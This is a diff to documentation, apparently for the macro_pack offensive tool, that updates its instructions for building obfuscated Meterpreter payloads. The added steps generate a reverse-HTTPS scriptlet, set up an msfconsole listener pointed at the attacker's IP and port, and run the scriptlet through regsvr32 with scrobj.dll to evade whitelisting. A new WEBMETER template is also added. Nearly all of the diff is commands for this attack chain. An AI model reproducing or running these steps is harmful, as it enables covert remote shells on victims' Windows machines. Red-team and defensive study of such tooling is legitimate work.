@@ -170,7 +170,7 @@ Open msfconsole:
 use exploit/multi/handler
 set LHOST 0.0.0.0
 set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript post/windows/manage/smart_migrate
+set AutoRunScript post/windows/manage/migrate
 set EXITFUNC thread
 set ExitOnSession false
 set EnableUnicodeEncoding true
@@ -192,22 +192,26 @@ mshta.exe full/path/to/info.hta
 ```
 
 
- - Generate obfuscated Meterpreter reverse TCP SCT file and run it  
+ - Generate obfuscated Meterpreter reverse https TCP SCT file and run it  
  ```batch
-# 1 Generate obfuscated VBS based on meterpreter template
-echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.sct
+# 1 Generate obfuscated VBS scriptlet based on meterpreter reverse HTTPS template
+echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.sct
 # 2 On attacker machinge Setup meterpreter listener
 Open msfconsole:
 use exploit/multi/handler
-set LHOST 0.0.0.0
-set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript post/windows/manage/smart_migrate
+set PAYLOAD windows/x64/meterpreter/reverse_https
+
+set LHOST <attacker_ip> # NOTE this cannot be 0.0.0.0 for reverse https
+set LPORT <port>
+set AutoRunScript post/windows/manage/migrate
 set EXITFUNC thread
 set ExitOnSession false
 set EnableUnicodeEncoding true
 set EnableStageEncoding true
-# 3 run VBS file with wscript (run 32bit wscript because meterpreter payload is 32bit)
-%windir%\syswow64\regsvr32 /u /n /s /i:meter.sct scrobj.dll
+exploit -j
+# 3 run scriptlet with regsvr32 
+regsvr32 /u /n /s /i:meter.sct scrobj.dll
+
 
  ```
 
@@ -378,14 +382,35 @@ Give this template the IP and PORT of listening mfsconsole
 Recommended msfconsole options (use exploit/multi/handler):
 ```
 set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript post/windows/manage/smart_migrate
+set LHOST <ip>
+set LPORT <port>
+set AutoRunScript post/windows/manage/migrate
 set EXITFUNC thread
 set ExitOnSession false
 set EnableUnicodeEncoding true
 set EnableStageEncoding true
+exploit -j
 ```
 
-Warning: This is a 32 bit meterpreter so it will crash Office if Office 64bit is installed!
+### WEBMETER  
+Meterpreter reverse TCP template using VbsMeter by Cn33liz.  
+This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw.  
+Give this template the IP and PORT of listening mfsconsole  
+  -> Example: ```echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.vsd``` 
+ 
+Recommended msfconsole options (use exploit/multi/handler):
+```
+set PAYLOAD windows/meterpreter/reverse_https (32bit)
+set PAYLOAD windows/x64/meterpreter/reverse_https (64bit)
+set AutoRunScript post/windows/manage/migrate
+set LHOST <ip>
+set LPORT <port>
+set EXITFUNC thread
+set ExitOnSession false
+set EnableUnicodeEncoding true
+set EnableStageEncoding true
+exploit -j
+```
 
 
 ### EMBED_EXE
